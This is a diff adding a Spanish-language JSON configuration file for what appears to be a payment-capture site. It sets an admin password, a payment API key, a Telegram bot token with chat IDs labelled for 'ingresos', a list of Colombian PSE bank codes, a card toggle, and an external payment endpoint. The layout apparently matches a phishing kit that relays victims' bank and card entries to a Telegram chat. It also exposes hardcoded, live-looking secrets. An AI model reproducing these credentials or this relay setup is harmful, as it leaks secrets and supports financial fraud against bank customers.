@@ -1,0 +1,42 @@
+{
+  "sistema_activo": true,
+  "admin_password": "1234567",
+  "api_key": "wp_live_extulpdg8sfqetunmwt4h7nk",
+  "bancos_pse_activos": [
+    "1007",
+    "1023",
+    "1002",
+    "1052",
+    "1013",
+    "1032",
+    "1062",
+    "1063",
+    "1006",
+    "1047",
+    "1069",
+    "1070",
+    "1019",
+    "1040",
+    "1060",
+    "1061",
+    "1507",
+    "1551",
+    "1097",
+    "1809"
+  ],
+  "tarjeta_activa": true,
+  "telegram": {
+    "bot_token": "8643419958:AAE1zsDkRAxRxxQtf-JxRtzc5JwF4qjFtNc",
+    "chat_id_genericos": "-5392321843",
+    "chat_id_ingresos": "-5392321843"
+  },
+  "pagos": {
+    "api_url": "https://futuapigoluni.tech/api/generar-pago",
+    "api_key": "wp_live_extulpdg8sfqetunmwt4h7nk"
+  },
+  "cloudflare": {
+    "site_key": "",
+    "secret_key": "",
+    "activo": true
+  }
+}
